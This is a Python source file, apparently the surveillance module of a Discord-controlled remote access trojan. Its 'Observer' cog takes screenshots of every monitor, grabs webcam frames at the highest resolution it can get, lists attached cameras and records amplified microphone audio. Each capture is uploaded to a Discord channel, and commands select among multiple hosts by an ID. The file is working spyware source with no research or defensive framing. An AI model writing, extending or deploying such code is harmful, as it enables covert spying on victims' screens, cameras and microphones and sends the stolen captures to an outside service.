import io
import cv2
import wave
import asyncio
import pyaudio
import discord
import numpy as np
from mss import mss
from PIL import Image
from discord.ext import commands
from module import CHUNK, FORMAT, CHANNELS, RATE, AMPLIFICATION_FACTOR

class Observer(commands.Cog):
    def __init__(self, app: commands.Bot):
        self.bot = app
        self.cam_lock = asyncio.Lock()

    @commands.command(name="screenshot", aliases=["ss", "capture"])
    async def take_screenshot(self, ctx, arg: str = None):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not getattr(self.bot, 'is_selected', False):
            return
        
        should_reply = False

        if arg is None:
            should_reply = True
        elif arg == my_id:
            should_reply = True
        
        if not should_reply:
            return

        await self.process_screenshot(ctx)

    async def process_screenshot(self, ctx):
        my_id = getattr(self.bot, 'port_id', 'Unknown')
        
        async with ctx.typing():
            try:
                loop = asyncio.get_running_loop()
                files, count = await loop.run_in_executor(None, self.capture_screens, my_id)
                if count > 1:
                    msg = f"**[{my_id}]** Multi-Monitor Captured ({count} screens)"
                else:
                    msg = f"**[{my_id}]** Screenshot captured."
                
                await ctx.send(content=msg, files=files)

                for file in files:
                    file.close()

            except Exception as e:
                await ctx.send(f"**[{my_id}]** Error: {e}")

    def capture_screens(self, myid: str):
        file_list = []
                    
        with mss() as sct:
            monitors = sct.monitors[1:]
                    
            if not monitors: 
                monitors = [sct.monitors[0]]

            for i, monitor in enumerate(monitors, start=1):
                sct_img = sct.grab(monitor)
                img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                            
                img_binary = io.BytesIO()
                img.save(img_binary, 'PNG')
                img_binary.seek(0)
                            
                filename = f"{myid}_Monitor_{i}.png"
                file_list.append(discord.File(fp=img_binary, filename=filename))
                            
        return file_list, len(monitors)

    @commands.command(name="webcam", aliases=["cam"])
    async def take_webcam(self, ctx, arg: str = None, num: int = 1):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        if not getattr(self.bot, 'is_selected', False):
            return
        
        should_run = False
        target_id = None
        webcam_num = 1
        if arg is None:
            pass
        elif arg.isdigit():
            webcam_num = int(arg)
        else:
            target_id = arg
            webcam_num = num

        if target_id is None:
            should_run = True
        elif target_id == my_id:
            should_run = True

        if not should_run:
            return    
        
        await self.process_webcam(ctx, webcam_num)

    # TODO: Fix Camera index out Issue
    @commands.command(name="camlist", aliases=["cams"])
    async def list_webcams(self, ctx, arg1: str = None, num: int = 1):    
        my_id = getattr(self.bot, 'port_id', 'Unknown')  

        if not getattr(self.bot, 'is_selected', False):
            return
        
        should_run = False
        target_id = None
        scan_num = 1
        if arg1 is None:
            pass
        elif arg1.isdigit():
            scan_num = int(arg1)
        else:
            target_id = arg1
            scan_num = num

        if target_id is None:
            should_run = True
        elif target_id == my_id:
            should_run = True

        if not should_run:
            return    
        
        async with ctx.typing():
            try:
                def scan_cameras_dynamic():
                    report = []
                    found_count = 0
                    for idx in range(scan_num): 
                        cap = cv2.VideoCapture(idx, cv2.CAP_ANY)
                        if cap.isOpened():
                            ret, frame = cap.read()

                            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
                            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
                                
                            status = ""
                            if ret and np.sum(frame) > 0:
                                status = "**Active**"
                            elif ret and np.sum(frame) == 0:
                                status = "**Black**"
                            else:
                                status = "**Error**"

                            report.append(f"**{idx+1}**. {status} `({width}x{height})`")
                            found_count += 1
                            cap.release() 
                    if not report:
                        return "No cameras detected.", 0
                    
                    return "\n".join(report), found_count

                loop = asyncio.get_running_loop()
                result_text, count = await loop.run_in_executor(None, scan_cameras_dynamic)
                
                embed = discord.Embed(
                    title=f"Connected Webcams - [{my_id}]",
                    description=f"**{count}** devices detected.\n\n{result_text}",
                    color=discord.Color.green() if count > 0 else discord.Color.red()
                )
                await ctx.send(embed=embed)

            except Exception as e:
                await ctx.send(f"**[{my_id}]** Error: {e}")

    async def process_webcam(self, ctx, num: int):
        my_id = getattr(self.bot, 'port_id', 'Unknown')

        target_index = num
        if target_index >= 1:
            target_index -= 1

        if self.cam_lock.locked():
            await ctx.send(f"**[{my_id}]** Camera is busy. Please wait...")
        async with self.cam_lock:
            async with ctx.typing():
                try:
                    loop = asyncio.get_running_loop()
                    image_binary, res_info = await loop.run_in_executor(None, self.capture_cam_safe, target_index)

                    if image_binary:
                        file = discord.File(fp=image_binary, filename=f"webcam_{my_id}.png")
                        await ctx.send(f"**[{my_id}]** Captured ({res_info}).", file=file)
                        image_binary.close()
                    else:
                        await ctx.send(f"**[{my_id}]** Error: {res_info}")

                except Exception as e:
                    await ctx.send(f"**[{my_id}]** System Error: {e}")


    def capture_cam_safe(self,target_index: int):
        cap = cv2.VideoCapture(target_index, cv2.CAP_ANY)
        if not cap.isOpened():
            print("Cannot open camera")
            cap = cv2.VideoCapture(target_index)
            if not cap.isOpened():
                return None, "Camera not found."
                            
        cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))

        resolutions = [
            (3840, 2160), # 4K
            (2560, 1440), # QHD
            (1920, 1080), # FHD 
            (1280, 720),  # HD
            (640, 480)    # VGA 
        ]
                        
        selected_res = "Default"

        for width, height in resolutions:
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
            
            actual_w = cap.get(cv2.CAP_PROP_FRAME_WIDTH)
            actual_h = cap.get(cv2.CAP_PROP_FRAME_HEIGHT)
            
            if actual_w == width and actual_h == height:
                selected_res = f"{int(actual_w)}x{int(actual_h)}"
                break

        print(f"[Webcam] Resolution set to: {selected_res}")

    
        for _ in range(30):
            ret, temp_frame = cap.read()
            if not ret: continue
            
            if np.sum(temp_frame) > 0:
                break
        
        for _ in range(10): cap.read()

        ret, frame = cap.read()
        cap.release()

        if not ret:
            return None, "Failed to capture."
        
        if np.sum(frame) == 0:
            return None, "Captured black screen (Camera error)."

        success, buffer = cv2.imencode(".png", frame)
        if not success:
            return None, "Encoding failed."

        return io.BytesIO(buffer.tobytes()), selected_res


    @commands.command(name="listen", aliases=["mic", "audio"])
    async def record_audio(self, ctx, arg: str = None, seconds: int = 10):
        my_id = getattr(self.bot, 'port_id', 'Unknown')  

        if not getattr(self.bot, 'is_selected', False):
            return

        if (seconds > 90) or (arg and arg.isdigit() and int(arg) > 90):
            await ctx.send("The maximum allowed duration is 90 seconds.")
            return
        
        should_run = False
        target_id = None
        second = 10
        if arg is None:
            pass
        elif arg.isdigit():
            second = int(arg)
        else:
            target_id = arg
            second = seconds

        if target_id is None:
            should_run = True
        elif target_id == my_id:
            should_run = True

        if not should_run:
            return    
        
        await self.process_record(ctx, second)

    async def process_record(self, ctx, seconds: int):
        my_id = getattr(self.bot, 'port_id', 'Unknown')
        await ctx.send(f"**[{my_id}]** Listening for {seconds}s...")

        async with ctx.typing():
            try:
                loop = asyncio.get_running_loop()
                audio_data, msg = await loop.run_in_executor(None, self.record_to_ram, seconds)

                if audio_data:
                    file = discord.File(fp=audio_data, filename=f"audio_{my_id}.wav")
                    await ctx.send(f"**[{my_id}]** Audio Clip Captured.", file=file)
                    audio_data.close() 
                else:
                    await ctx.send(f"**[{my_id}]** Error: {msg}")

            except Exception as e:
                await ctx.send(f"**[{my_id}]** Mic Error: {e}")


    def record_to_ram(self, seconds: int):
        audio = pyaudio.PyAudio()
        try:
            stream = audio.open(
                format=FORMAT,
                channels=CHANNELS,
                rate=RATE,
                input=True,
                frames_per_buffer=CHUNK)
        except OSError:
            return None, "Microphone not found or access denied."

        frames = []
                    
        for _ in range(0, int(RATE / CHUNK * seconds)):
            data = stream.read(CHUNK, exception_on_overflow=False)
            audio_data = np.frombuffer(data, dtype=np.int16)
            amplified = np.clip(audio_data * AMPLIFICATION_FACTOR, -32768, 32767)
            frames.append(amplified.astype(np.int16).tobytes())
            
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        audio_buffer = io.BytesIO()
        with wave.open(audio_buffer, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(audio.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
                    
        audio_buffer.seek(0) 
        return audio_buffer, "Success"

async def setup(app: commands.Bot):
    await app.add_cog(Observer(app))